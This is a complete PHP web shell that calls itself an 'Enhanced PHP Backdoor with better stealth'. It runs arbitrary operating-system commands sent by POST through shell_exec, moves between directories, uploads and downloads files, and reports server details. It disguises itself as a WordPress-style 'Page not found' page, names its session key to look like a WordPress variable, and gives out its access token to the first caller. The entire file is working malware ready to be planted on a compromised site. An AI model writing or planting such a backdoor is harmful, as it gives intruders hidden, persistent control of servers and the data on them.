<?php
// Enhanced PHP Backdoor with better stealth
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    // Return 200 instead of 404 to avoid suspicion
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>WordPress Style</title></head><body><h1>Page not found</h1></body></html>';
    exit;
}

// Start session quietly
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Stealth mode - don't use obvious session variables
$session_key = 'wp_' . md5(__FILE__);
if (!isset($_SESSION[$session_key])) {
    $_SESSION[$session_key] = [
        'dir' => getcwd(),
        'token' => md5(uniqid() . $_SERVER['HTTP_HOST'] ?? '')
    ];
}

// Simple stealth authentication
$auth_valid = false;
if (isset($_POST['k']) && $_POST['k'] === $_SESSION[$session_key]['token']) {
    $auth_valid = true;
}

// For initial connection, allow without auth
if (!isset($_POST['cmd']) && !isset($_POST['k'])) {
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'ready',
        'dir' => $_SESSION[$session_key]['dir'],
        'token' => $_SESSION[$session_key]['token']
    ]);
    exit;
}

// For subsequent commands, require auth
if (!$auth_valid && isset($_POST['cmd'])) {
    header('HTTP/1.1 403 Forbidden');
    echo 'Access Denied';
    exit;
}

$current_dir = $_SESSION[$session_key]['dir'];

// Command processing
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // Ensure we're in the correct directory
    if (!chdir($current_dir)) {
        echo json_encode(['status' => 'error', 'message' => 'Directory access failed']);
        exit;
    }

    switch ($cmd) {
        case 'cd':
            $path = $_POST['path'] ?? '';
            handle_cd($path, $session_key);
            break;
        case 'upload':
            handle_upload($session_key);
            break;
        case 'download':
            handle_download();
            break;
        case 'info':
            handle_info();
            break;
        default:
            handle_command($cmd, $session_key);
    }
}

function handle_cd($path, $session_key) {
    $current_dir = $_SESSION[$session_key]['dir'];
    
    if (empty($path)) {
        echo json_encode(['status' => 'error', 'message' => 'No path provided']);
        return;
    }

    $path = str_replace('\\', '/', trim($path));
    
    if ($path === '..') {
        $new_path = dirname($current_dir);
    } elseif ($path === '.') {
        $new_path = $current_dir;
    } else {
        $new_path = $path[0] === '/' ? $path : $current_dir . '/' . $path;
    }

    $real_path = realpath($new_path);
    
    if ($real_path && is_dir($real_path) && is_readable($real_path)) {
        chdir($real_path);
        $_SESSION[$session_key]['dir'] = getcwd();
        echo json_encode([
            'status' => 'success', 
            'dir' => $_SESSION[$session_key]['dir']
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid directory: ' . $path]);
    }
}

function handle_upload($session_key) {
    if (!isset($_FILES['f'])) {
        echo json_encode(['status' => 'error', 'message' => 'No file uploaded']);
        return;
    }

    $file = $_FILES['f'];
    $target = $_POST['t'] ?? $file['name'];
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        echo json_encode(['status' => 'success', 'message' => 'Uploaded: ' . $target]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Upload failed']);
    }
}

function handle_download() {
    $file = $_POST['f'] ?? '';
    
    if (empty($file) || !file_exists($file) || !is_readable($file)) {
        header('HTTP/1.1 404 Not Found');
        exit;
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

function handle_info() {
    $info = [
        'php' => PHP_VERSION,
        'os' => PHP_OS,
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
        'cwd' => getcwd(),
        'disabled' => ini_get('disable_functions') ?: 'None'
    ];
    
    echo json_encode(['status' => 'success', 'info' => $info]);
}

function handle_command($cmd, $session_key) {
    $is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    
    // Update current directory in session
    $_SESSION[$session_key]['dir'] = getcwd();
    
    if ($is_win) {
        $output = shell_exec("cmd /c " . escapeshellarg($cmd) . " 2>&1");
    } else {
        $output = shell_exec("$cmd 2>&1");
    }
    
    echo json_encode([
        'status' => 'success',
        'output' => $output ?: 'No output',
        'dir' => $_SESSION[$session_key]['dir']
    ]);
}
?>